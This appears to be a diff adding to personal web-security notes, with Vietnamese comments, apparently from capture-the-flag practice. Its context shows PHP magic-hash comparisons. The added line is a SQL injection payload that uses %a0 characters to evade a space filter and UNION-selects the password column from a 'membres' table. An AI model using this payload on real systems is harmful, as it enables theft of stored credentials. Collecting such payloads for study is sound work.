@@ -44,3 +44,7 @@ echo $get ; // lúc trưa truyền thì in ra notme , khi get=jjjj in ra jjj
     0e087386482136013740957780965295=0
     10e087386482136013740957780965295=10
    
+
+
+
+-1%a0UNION%a0SELECT%a0*%a0FROM%a0(SELECT%a0pass%a0From%a0membres%a0Limit%a01)a%a0JOIN%a0(SELECT%a02)b%a0JOIN%a0(SELECT%a03)c%a0JOIN%a0(SELECT%a04)d  1 bài filter nào đó 
